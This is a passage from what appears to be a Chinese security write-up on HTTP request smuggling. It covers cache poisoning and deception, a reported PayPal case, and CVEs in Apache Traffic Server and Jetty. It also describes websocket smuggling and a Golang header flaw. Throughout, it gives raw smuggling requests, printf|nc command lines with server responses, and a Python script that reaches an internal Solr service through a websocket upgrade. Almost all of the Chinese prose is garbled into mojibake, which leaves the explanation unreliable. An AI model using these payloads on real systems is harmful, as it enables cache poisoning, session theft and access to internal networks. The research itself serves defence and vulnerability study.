application/x-www-form-urlencoded Content-Length: 10 x=1 ç„¶åè®¿é—®/resources/js/tracking.js:\n \næˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“åº”åŒ…çš„è·³è½¬åœ°å€è¢«æˆ‘ä»¬ä¿®æ”¹æˆäº†æˆ‘ä»¬ exploit çš„æœåŠ¡å™¨åœ°å€ï¼Œç„¶åæˆ‘ä»¬è®¿é—®æ­£å¸¸æœåŠ¡å™¨ä¸»é¡µè¯•è¯•ï¼š\n \nå¯ä»¥çœ‹åˆ°æˆåŠŸalert(1)ã€‚\næ•´ä¸ªæµç¨‹æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»¥ä¸‹æµç¨‹æ¥ç†è§£ï¼š\nInnocent Attacker Front Backend | | | | | |--A(1A+1/2B)--\u0026gt;| | | | |--A(1A+1/2B)--\u0026gt;| | | |\u0026lt;-A(200)-------| | | | [1/2B] | |\u0026lt;-A(200)-------| [1/2B] | |--C-----------\u0026gt;| [1/2B] | | |--C-----------\u0026gt;| * ending B * | | [*CP*]\u0026lt;--B(200)----| | |\u0026lt;--B(200)------| | |--C---------------------------\u0026gt;| | |\u0026lt;--B(200)--------------------[HIT] |  1A + 1/2B means request A + an incomplete query B A(X) : means X query is hidden in body of query A CP : Cache poisoning  ä¸ä¹‹å‰é‚£ä¸ªæµç¨‹å›¾ç±»ä¼¼ï¼Œå› ä¸ºåœ¨ C è¯·æ±‚çš„/resources/js/tracking.jsä¼šè¢« Front è®¤ä¸ºæ˜¯é™æ€èµ„æºç¼“å­˜èµ·æ¥ï¼Œè€Œæˆ‘ä»¬åˆ©ç”¨ HTTP Smuggling å°†è¿™ä¸ªè¯·æ±‚å¯¼å‘äº†æˆ‘ä»¬çš„ exploit æœåŠ¡å™¨ï¼Œè¿”å›äº†alert(1)ç»™ C è¯·æ±‚ï¼Œç„¶åè¿™ä¸ªå“åº”åŒ…å°±ä¼šè¢« Front æœåŠ¡å™¨ç¼“å­˜èµ·æ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±æˆåŠŸè¿›è¡Œäº†æŠ•æ¯’ã€‚\nPerform Web Cache Deception å…¶å®è¿™ä¸ªåœºæ™¯ä¸ç¼“å­˜æŠ•æ¯’ç±»ä¼¼ï¼Œä½†æ˜¯ç¨æœ‰ä¸€ç‚¹åŒºåˆ«ï¼ŒæŒ‰ç…§æ¯”è¾ƒå®˜æ–¹çš„è¯´æ³•ï¼Œç¼“å­˜æ¬ºéª—ä¸ç¼“å­˜æŠ•æ¯’æœ‰ä»¥ä¸‹è¿™äº›åŒºåˆ«ï¼š\n â€‹\tWhat is the difference between web cache poisoning and web cache deception?\n In web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users. In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.   åœ¨ Web ç¼“å­˜æŠ•æ¯’ä¸­ï¼Œæ”»å‡»è€…ä½¿åº”ç”¨ç¨‹åºå°†æŸäº›æ¶æ„å†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œå¹¶å°†è¯¥å†…å®¹ä»ç¼“å­˜ä¸­æä¾›ç»™å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚ åœ¨Webç¼“å­˜æ¬ºéª—ä¸­ï¼Œæ”»å‡»è€…ä½¿åº”ç”¨ç¨‹åºå°†ä¸€äº›å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„æ•æ„Ÿå†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢è¯¥å†…å®¹ã€‚\nè¿™ä¸ªæˆ‘ä»¬å°±ä¸é…åˆ Lab: Exploiting HTTP request smuggling to perform web cache deception æ¥åšäº†ï¼Œå› ä¸º LAB æä¾›çš„ç¯å¢ƒ victim æœ‰ç‚¹é—®é¢˜ã€‚\næˆ‘ä»¬å¯ä»¥è¿™ä¹ˆç†è§£ï¼Œæˆ‘ä»¬å‘é€å¦‚ä¸‹ HTTP è¯·æ±‚ï¼š\nPOST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 43 Transfer-Encoding: chunked 0 GET /private/messages HTTP/1.1 Foo: X è¯¥ Smugle çš„è¯·æ±‚ä¼šç”¨Foo: Xåƒæ‰ä¸‹ä¸€ä¸ªå‘è¿‡æ¥çš„è¯·æ±‚å¤´çš„ç¬¬ä¸€è¡Œï¼Œä¹Ÿå°±æ˜¯GET /xxx HTTP/1.1é‚£ä¸€è¡Œï¼Œå¹¶ä¸”è¿™ä¸ªè¯·æ±‚è¿˜ä¼šå¸¦ç€ç”¨æˆ·çš„ Cookie å»è®¿é—®ï¼Œç±»ä¼¼äºä¸€ä¸ªCSRFï¼Œè¯¥è¯·æ±‚å˜æˆäº†ä»¥ä¸‹è¯·æ±‚å¤´ï¼š\nGET /private/messages HTTP/1.1 Foo: XGET /static/some-image.png HTTP/1.1 Host: vulnerable-website.com Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z åªè¦æˆ‘ä»¬å¤šå‘é€å‡ æ¬¡ï¼Œä¸€æ—¦ç”¨æˆ·è®¿é—®çš„æ˜¯é™æ€èµ„æºï¼Œå°±å¯èƒ½ä¼šè¢« Front æœåŠ¡å™¨ç¼“å­˜èµ·æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°ç”¨æˆ·/private/messagesçš„ä¿¡æ¯äº†ã€‚è¿™é‡Œå¯èƒ½éœ€è¦å¤§é‡çš„é‡å¤å‘åŒ…ï¼Œå› ä¸ºéœ€è¦æ„é€ è®©é™æ€èµ„æºç¼“å­˜ï¼Œè¿˜æ˜¯éœ€è¦ä¸€å®šè¿æ°”çš„ã€‚\nè‡³æ­¤ï¼ŒHTTP Smuggling çš„åŸºæœ¬æ”»å‡»é¢éƒ½å·²ç»ä»‹ç»å®Œæ¯•äº†ã€‚\nReal World Paypal é¦–å…ˆè‚¯å®šå¾—æ¥èŠèŠä»Šå¹´åˆ†äº« HTTP Smuggling çš„ä½œè€…åœ¨ Black Hat ä¸Šåˆ†äº«çš„ Paypal æ¼æ´å®ä¾‹äº†\nä½œè€…é¦–å…ˆé€šè¿‡ HTTP Smuggling çš„æ–¹å¼å°†ä¸€ä¸ªç”¨äº Paypal ç™»å½•çš„ js æ–‡ä»¶è¿›è¡Œäº†æŠ•æ¯’ï¼š\nPOST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 Host: c.paypal.com Content-Length: 61 Transfer-Encoding: chunked 0 GET /webstatic HTTP/1.1 Host: skeletonscribe.net? X: XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1  Host: c.paypal.com Connection: close HTTP/1.1 302 Found Location: http://skeletonscribe.net?, c.paypal.com/webstatic/ ä½†æ˜¯ Paypal ç™»å½•é¡µé¢æœ‰ CSP è§„åˆ™ script-src é™åˆ¶äº†è¿™ä¸ªè·³è½¬ã€‚\n \nåæ¥ä½œè€…å‘ç°è¯¥é¡µé¢è¿˜æœ‰ä¸€ä¸ªåŠ¨æ€ç”Ÿæˆçš„ iframe å¼•å…¥äº† c.paypal.com ï¼Œä¸”è¯¥å­é¡µé¢æ²¡æœ‰ CSP è€Œä¸”è¿˜å¼•å…¥äº†ä½œè€…æŠ•æ¯’çš„ js æ–‡ä»¶ï¼è™½ç„¶è¿™æ ·å¯ä»¥æ§åˆ¶ iframe é¡µé¢ï¼Œä½†æ˜¯ç”±äºåŒæºç­–ç•¥ï¼Œæ˜¯è¯»ä¸åˆ°çˆ¶é¡µé¢çš„æ•°æ®çš„ã€‚\n \nå†æ¥ç€ä½œè€…çš„åŒäº‹åœ¨ paypal.com/us/gifts å‘ç°äº†ä¸€ä¸ªä¸ä½¿ç”¨ CSP çš„é¡µé¢ï¼Œå¹¶ä¸”ä¹Ÿå¯¼å…¥äº†ä½œè€…æŠ•æ¯’çš„ js æ–‡ä»¶ï¼Œè¿™æ ·ä½œè€…ç»ˆäºé€šè¿‡ js å°† c.paypal.com çš„ iframe é‡å®šå‘åˆ°äº† paypal.com/us/gifts ï¼Œè¿™æ ·å°±åŒæºäº†ï¼Œä¹Ÿå°±å¯ä»¥è¯»å–çˆ¶é¡µé¢çš„æ•°æ®äº†ã€‚\n \nPaypal ç¬¬ä¸€æ¬¡ä¿®å¤æ˜¯å°† Akamai é…ç½®ä¿®æ”¹æˆæ‹’ç»å«æœ‰ Transfer-Encoding: chunked çš„è¯·æ±‚ï¼Œä½†æ˜¯åæ¥åˆè¢«ä½œè€…æ„é€ äº†ä¸€ä¸ªæ¢è¡Œçš„ header ç»•è¿‡äº†ï¼š\nTransfer-Encoding: chunked ATS  â€‹\tApache Traffic Serverï¼ˆATSï¼‰æ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰è½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€æ¬¾é«˜æ•ˆã€å¯æ‰©å±•çš„HTTPä»£ç†å’Œç¼“å­˜æœåŠ¡å™¨ã€‚\nApache ATS 6.0.0ç‰ˆæœ¬è‡³6.2.2ç‰ˆæœ¬å’Œ7.0.0ç‰ˆæœ¬è‡³7.1.3ç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´å®æ–½HTTPè¯·æ±‚èµ°ç§æ”»å‡»æˆ–é€ æˆç¼“å­˜ä¸­æ¯’ã€‚\nåœ¨ç¾å›½å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´åº“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å…³äºè¯¥æ¼æ´çš„å››ä¸ªè¡¥ä¸ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¯¦ç»†çœ‹ä¸€ä¸‹ã€‚\nCVE-2018-8004 è¡¥ä¸åˆ—è¡¨\n https://github.com/apache/trafficserver/pull/3192 https://github.com/apache/trafficserver/pull/3201 https://github.com/apache/trafficserver/pull/3231 https://github.com/apache/trafficserver/pull/3251  æ³¨ï¼šè™½ç„¶æ¼æ´é€šå‘Šä¸­æè¿°è¯¥æ¼æ´å½±å“èŒƒå›´åˆ°7.1.3ç‰ˆæœ¬ï¼Œä½†ä»githubä¸Šè¡¥ä¸å½’æ¡£çš„ç‰ˆæœ¬ä¸­çœ‹ï¼Œåœ¨7.1.3ç‰ˆæœ¬ä¸­å·²ç»ä¿®å¤äº†å¤§éƒ¨åˆ†çš„æ¼æ´ã€‚\n å…³äºè¿™å››ä¸ªè¡¥ä¸çš„åˆ†æä¸å¤ç°æˆ‘è§‰å¾— @mengchen å¸ˆå‚…å·²ç»å†™çš„éå¸¸è¯¦ç»†äº†ï¼Œæˆ‘å°±ä¸åœ¨èµ˜è¿°äº†ï¼Œå»ºè®®çœ‹åŸæ–‡éƒ¨åˆ† HTTPèµ°ç§æ”»å‡»å®ä¾‹â€”â€”CVE-2018-8004\nè¿™é‡Œæˆ‘ä»¬è¯´ä¸€ä¸‹åŸæ–‡æ²¡æœ‰çš„éƒ¨åˆ†ï¼š\n\t[dummy-host7.example.com] | +-[8080]-----+ | 8007-\u0026gt;8080 | | ATS7 | | | +-----+------+ | | +--[80]----+ | 8002-\u0026gt;80 | | Nginx | | | +----------+ æˆ‘ä»¬æ„å»ºä»¥ä¸Šåœºæ™¯ï¼Œå¯ä»¥ä½¿ç”¨æˆ‘æ­å»ºçš„ docker å®éªŒç¯å¢ƒ lab1\nRequest Splitting using Huge Header æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ 65535 ä¸ªå­—ç¬¦çš„ header æ¥è¿›è¡Œå®éªŒï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ä»¥ä¸‹ä»£ç æ¥å‘é€ä¸€ä¸ªå«æœ‰ 65535 ä¸ªå­—ç¬¦çš„ header çš„è¯·æ±‚åˆ° ATS 7:\nprintf \u0026#39;GET_/something.html?zorg2=5_HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:_dummy-host7.example.com\\r\\n\u0026#39;\\ \u0026#39;X:_\u0026#34;%65534s\u0026#34;\\r\\n\u0026#39;\\ \u0026#39;GET_http://dummy-host7.example.com/index.html?replaced=0\u0026amp;cache=8_HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ |tr \u0026#34; \u0026#34; \u0026#34;1\u0026#34;\\ |tr \u0026#34;_\u0026#34; \u0026#34; \u0026#34;\\ |nc -q 1 127.0.0.1 8007 nginx çš„è¿”å›ä¼šç›´æ¥è¿”å› 400 é”™è¯¯ï¼Œä½†æ˜¯æœ‰ ATS 7 å°±æ¯”è¾ƒæœ‰è¶£äº†ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª 400 å“åº”ä»¥åŠ ATS 7 çš„ 200 å“åº”\nHTTP/1.1 400 Invalid HTTP Request Date: Fri, 29 Nov 2019 18:52:42 GMT Connection: keep-alive Server: ATS/7.1.1 Cache-Control: no-store Content-Type: text/html Content-Language: en Content-Length: 220 \u0026lt;HTML\u0026gt; \u0026lt;HEAD\u0026gt; \u0026lt;TITLE\u0026gt;Bad Request\u0026lt;/TITLE\u0026gt; \u0026lt;/HEAD\u0026gt; \u0026lt;BODY BGCOLOR=\u0026#34;white\u0026#34; FGCOLOR=\u0026#34;black\u0026#34;\u0026gt; \u0026lt;H1\u0026gt;Bad Request\u0026lt;/H1\u0026gt; \u0026lt;HR\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica,Arial\u0026#34;\u0026gt;\u0026lt;B\u0026gt; Description: Could not process this request. \u0026lt;/B\u0026gt;\u0026lt;/FONT\u0026gt; \u0026lt;HR\u0026gt; \u0026lt;/BODY\u0026gt; HTTP/1.1 200 OK Server: ATS/7.1.1 Date: Fri, 29 Nov 2019 18:52:42 GMT Content-Type: text/html Content-Length: 119 Last-Modified: Fri, 29 Nov 2019 05:37:09 GMT ETag: \u0026#34;5de0ae85-77\u0026#34; X-Location-echo: /index.html?replaced=0\u0026amp;cache=8 X-Default-VH: 0 Cache-Control: public, max-age=300 Accept-Ranges: bytes Age: 0 Connection: keep-alive \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Nginx default static page\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;It works!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Jetty Jetty æœ‰ä¸‰ä¸ªä¸ HTTP Smuggling ç›¸å…³çš„ CVEï¼š\n  CVE-2017-7656 HTTP/0.9 issue\n â€‹\tIn Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space URI space version) that declares a version of HTTP/0.9 was accepted and treated as a 0.9 request. If deployed behind an intermediary that also accepted and passed through the 0.9 version (but did not act on it), then the response sent could be interpreted by the intermediary as HTTP/1 headers. This could be used to poison the cache if the server allowed the origin client to generate arbitrary content in the response.\n   CVE-2017-7657 Chunk size attribute truncation\n â€‹\tIn Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request.\n   CVE-2017-7658 Double Content-Length\n â€‹\tIn Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined request would bypass that authorization.\n   å¯¹äº CVE-2017-7658 æˆ‘ä»¬å°±ä¸å†æ¢ç©¶äº†ï¼Œå› ä¸ºä¹‹å‰ä¹Ÿæè¿‡äº†ï¼Œæˆ‘ä»¬ä¸»è¦æ¥çœ‹å¦å¤–ä¸¤ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„åœ°æ–¹ã€‚\nHTTP/0.9 ç¯å¢ƒä¾æ—§å¯ä»¥ä½¿ç”¨æˆ‘æ„å»ºçš„ jetty lab ç¯å¢ƒï¼Œç„¶åæˆ‘ä»¬ç”¨å¦‚ä¸‹æ–¹å¼å‘é€ä¸€ä¸ªæ ‡å‡†çš„ HTTP/0.9 è¯·æ±‚ï¼š\nprintf \u0026#39;GET /?test=4564\\r\\n\u0026#39;|nc -q 1 127.0.0.1 8994 å¾—åˆ°ä¸€ä¸ª 400 å“åº”ï¼š\nHTTP/1.1 400 HTTP/0.9 not supported Content-Type: text/html;charset=iso-8859-1 Content-Length: 65 Connection: close Server: Jetty(9.4.9.v20180320) \u0026lt;h1\u0026gt;Bad Message 400\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason: HTTP/0.9 not supported\u0026lt;/pre\u0026gt; æ¥ç€æˆ‘ä»¬åŠ ä¸Šç‰ˆæœ¬æ ‡è¯†ï¼š\nprintf \u0026#39;GET /?test=4564 HTTP/0.9\\r\\n\\r\\n\u0026#39;|nc -q 1 127.0.0.1 8994 è™½ç„¶è¿™æ˜¯ HTTP/0.9 ä¸æ”¯æŒçš„æ ¼å¼ï¼Œä½†æ˜¯ä¹Ÿä¼šæœ‰æ„å¤–çš„æ”¶è·ï¼Œå¾—åˆ°ä¸€ä¸ª 200 å“åº”ï¼š\n\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Sample \u0026quot;Hello, World\u0026quot; Application\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body bgcolor=white\u0026gt; \u0026lt;table border=\u0026quot;0\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; ... è¿™é‡Œçš„å“åº”æ²¡æœ‰ headers ï¼Œåªæœ‰ body ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªè¯·æ±‚è¢« HTTP/0.9 è¿›è¡Œäº†è§£æã€‚\nè€Œä¸”æ›´æœ‰æ„æ€çš„æ˜¯ï¼Œæ·»åŠ ä¸Š HTTP/0.9 ä¸æ”¯æŒçš„ headers ä¹Ÿä¼šæœ‰æ„å¤–çš„æ”¶è·ï¼Œè¿™é‡Œæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªæå–å“åº”åŒ…éƒ¨åˆ†å†…å®¹çš„ headerï¼š\nprintf 'GET /?test=4564 HTTP/0.9\\r\\n'\\ 'Range: bytes=36-42\\r\\n'\\ '\\r\\n'\\ |nc -q 1 127.0.0.1 8994 , World ä¼šå‘ç° body å†…å®¹è¢«æˆ‘ä»¬è¿›è¡Œäº†æå–ï¼Œç»“åˆæˆ‘ä»¬ä¸Šæ–‡æåˆ°çš„ç»“åˆ HTTP Version è¿›è¡Œçš„ HTTP Response Splitting ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå„ç§èŠ±å¼æ”»å‡»\nChunk size attribute truncation æˆ‘ä»¬åˆ©ç”¨ä»¥ä¸‹ä»£ç å‘é€è¯·æ±‚ï¼š\nprintf \u0026#39;POST /?test=4973 HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#39;\\ \u0026#39;Host: localhost\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;100000000\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;POST /?test=4974 HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Content-Length: 5\\r\\n\u0026#39;\\ \u0026#39;Host: localhost\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ |nc -q 1 127.0.0.1 8994|grep \u0026#34;HTTP/1.1\u0026#34; ç„¶åæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸¤ä¸ª 200 å“åº”å¯æ˜¯æŒ‰ç…§ chunk çš„æ ‡å‡†ï¼Œè™½ç„¶ç¬¬äºŒä¸ªéƒ¨åˆ†çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªè¯·æ±‚ï¼Œä½†æ˜¯å®é™…ä¸Šåº”è¯¥è¢«ç®—åœ¨ chunk data å½“ä¸­ï¼Œè€Œé—®é¢˜å°±åœ¨è¿™ï¼Œjetty è¿”å›äº†ä¸¤ä¸ªè¯·æ±‚ï¼ŒæŠŠ 100000000 å½“ä½œäº† 0 ï¼Œä¹Ÿå°±æ˜¯ chunk end éƒ¨åˆ†ï¼Œæ‰€ä»¥å°±å‡ºç°äº†ä¸¤ä¸ªè¯·æ±‚çš„åŸå› ã€‚\næˆ‘ä»¬å¯ä»¥å†è¿›è¡Œä¸€äº›å°è¯•ï¼š\nprintf \u0026#39;POST /?test=4975 HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#39;\\ \u0026#39;Host: localhost\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;1ff00000008\\r\\n\u0026#39;\\ \u0026#39;abcdefgh\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;POST /?test=4976 HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Content-Length: 5\\r\\n\u0026#39;\\ \u0026#39;Host: localhost\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ |nc -q 1 127.0.0.1 8994|grep \u0026#34;HTTP/1.1\u0026#34; è¿™é‡Œæˆ‘ä»¬ä¾ç„¶å¾—åˆ°äº†ä¸¤ä¸ª 200 å“åº”ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ª chunk size 1ff00000008 è¢« jetty æˆªæ–­æˆäº† 8 ï¼Œä¹Ÿå°±æ˜¯ chunk data éƒ¨åˆ†åªæœ‰abcdefghï¼Œæ‰€ä»¥å°±è¿”å›äº†ä¸¤ä¸ªå“åº”ã€‚\nä¸ Apache CVE-2015-3183 ç±»ä¼¼ï¼Œjetty åªä¼šå– chunk size çš„æœ€å8ä¸ªå­—èŠ‚ï¼š\nffffffffffff00000000\\r\\n ^^^^^^^^ 00000000 =\u0026gt; size 0 1ff00000008\\r\\n ^^^^^^^^ 00000008 =\u0026gt; size 8 Websocket å…¶å®è¿™éƒ¨åˆ†å®Œå…¨å¯ä»¥ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„éƒ¨åˆ†ï¼Œä½†æ˜¯æ„Ÿè§‰ç¯‡å¹…æœ‰ç‚¹é•¿äº†ï¼Œè¿™é‡Œå°±åšä¸€ä¸‹ç®€å•çš„ä»‹ç»ï¼Œåœ¨ Hackactivity 2019 ä¸Šï¼Œ@0ang3el æå‡ºäº†ä¸ Websocket ç›¸å…³çš„æ”»å‡»æŠ€æœ¯ Whatâ€™s wrong with WebSocket APIs? Unveiling vulnerabilities in WebSocket APIs.ï¼Œè®©æˆ‘æ¯”è¾ƒæ„Ÿå…´è¶£çš„åˆ™æ˜¯ Websocket Smuggling çš„éƒ¨åˆ†ã€‚\nä½œè€…ä¹ŸæŠŠç›¸å…³çš„æè¿°æ”¾åœ¨äº† websocket-smuggle è¿™é‡Œï¼Œè¿™ä¸ªæ”»å‡»é¢æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå¸®å¤§å®¶ä¸€å¥è¯æ€»ç»“å°±æ˜¯åœ¨ websocket å»ºç«‹è¿æ¥æ—¶ï¼Œå¦‚æœåå‘ä»£ç†æ²¡æœ‰å®Œå…¨ä¸¥æ ¼éµå®ˆ RFC 6445 æ ‡å‡†ï¼Œåœ¨å¤„ç†Sec-WebSocket-Version ç‰ˆæœ¬é”™è¯¯çš„æƒ…å†µå¹¶æ²¡æœ‰åšå¥½ç›¸åº”çš„å¤„ç†ï¼Œå¯¼è‡´äº†ä¿æŒäº†å®¢æˆ·ç«¯ä¸åç«¯æœåŠ¡å™¨ TCP/TLS çš„è¿æ¥ï¼Œæ‰€ä»¥é€ æˆäº†æˆ‘ä»¬å¯ä»¥è¿›è¡Œ Smuggling è¯·æ±‚çš„æ”»å‡»ï¼Œè¿™é‡Œç›´æ¥è¡¨ç°ä¸ºå¯ä»¥é€šè¿‡è¿™ç§æ”»å‡»è®¿é—®å†…ç½‘ã€‚\nè¿™é‡Œæˆ‘ä»¬å‡è®¾å†…ç½‘å­˜åœ¨ solr æœåŠ¡ï¼Œå¤–ç½‘æ— æ³•è®¿é—®ï¼Œå¦‚æœå­˜åœ¨ websocket smuggling ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™ä»¥ä¸‹ä»£ç è®¿é—® solr æœåŠ¡ï¼š\nimport socket req1 = \u0026#34;\u0026#34;\u0026#34;GET /socket.io/?EIO=3\u0026amp;transport=websocket HTTP/1.1 Host: ip:port Sec-WebSocket-Version: 1338 Upgrade: websocket \u0026#34;\u0026#34;\u0026#34;.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) req2 = \u0026#34;\u0026#34;\u0026#34;GET /solr/#/ HTTP/1.1 Host: localhost:8983 \u0026#34;\u0026#34;\u0026#34;.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) def main(netloc): host, port = netloc.split(\u0026#39;:\u0026#39;) sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, int(port))) sock.sendall(req1) sock.recv(4096) sock.sendall(req2) # print req2 data = sock.recv(4096) data = data.decode(errors = \u0026#39;ignore\u0026#39;) print(data) data = sock.recv(4096) data = data.decode(errors = \u0026#39;ignore\u0026#39;) print(data) sock.shutdown(socket.SHUT_RDWR) sock.close() if __name__ == \u0026#34;__main__\u0026#34;: main(\u0026#39;ip:port\u0026#39;) åœ¨ä»Šå¹´çº¢å¸½æ¯ä¸Šä¹Ÿæœ‰ä½¿ç”¨è¿™ä¸ªæ”»å‡»æŠ€æœ¯çš„ä¸€é“ CTF èµ›é¢˜ï¼Œç›¸å…³çš„ writeup å¯ä»¥çœ‹çœ‹ Red Hat 2019 Web Write Up\nGolang è¿™ä¸ªæ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€ä¸ªéƒ¨åˆ†ï¼Œå½“æ—¶æ˜¯åœ¨10æœˆåˆ fuzz çš„ï¼Œç„¶åä¹Ÿæ‰¾äº†æŒºä¹…çš„ç›®æ ‡ï¼Œæœ€ååœç•™åœ¨äº†ä¹‹å‰åŒå­¦æ¨èçš„ä¸€ä¸ªä¸­é—´ä»¶ caddy ä¸Šï¼ˆç°åœ¨æ˜¯ 11æœˆ 27 æ—¥ï¼Œç«Ÿç„¶å‡º caddy 2 äº†\u0026hellip;ï¼‰ï¼Œç„¶åæ‹¿ä»–è¿›è¡Œäº†å®éªŒï¼Œç”±äºè‡ªå·±æ¯”è¾ƒæ‡’ç”¨äº† docker hub ä¸Šçš„ç¯å¢ƒ caddyã€‚\näºæ˜¯å°±æœ‰äº†ï¼š\n \nå½“æ—¶æ‰¾åˆ°æŒºå¼€å¿ƒçš„ï¼Œä»¥ä¸ºä¸€ä¸ª CVE å°±è¿™ä¹ˆç®€å•çš„åˆ°æ‰‹äº†ï¼Œå› ä¸º Netty CVE ç»™çš„å¯ç¤ºå˜›ï¼Œè¿™ä¹Ÿç®—æ˜¯ä¸€ä¸ªè§£æå·®å¼‚ã€‚ç„¶åå½“æ—¶æˆ‘è·Ÿå¯¼å¸ˆè¿˜ä»”ç»†æ·±å…¥æ¢ç©¶äº†è¿™ä¸ªäº§ç”Ÿçš„åŸå› ï¼Œè·Ÿäº†ä¸€ä¸‹ä»£ç ï¼Œå‘ç°å¯èƒ½æ˜¯ Go æŸä¸ªåŸç”Ÿåº“çš„åŸå› ï¼Œæˆ‘æœ¬åœ°ä¹Ÿå•ç‹¬æŠ½äº†å…¶ä¸­æœ‰é—®é¢˜çš„ä»£ç æµ‹äº†ä¸€éï¼Œç¡®è®¤å°±æ˜¯é‚£ä¸ªåº“çš„åŸå› ã€‚\nå½“æ—¶å¯å¼€å¿ƒäº†ï¼Œèµ¶ç´§å™¼é‡Œå•ªå•¦æœç´¢å¦‚ä½•ç»™ Golang æ issue ï¼Œç»“æœåæ¥ä»”ç»†å¼„äº†ä¸€ä¼šï¼Œå‘ç°è¿™ä¸ªé—®é¢˜åœ¨ 9æœˆ27æ—¥å·²ç»è¢«æåˆ°äº† net/http: invalid headers are normalized, allowing request smugglingï¼ŒGolang ä¹Ÿåœ¨ 1.13.1 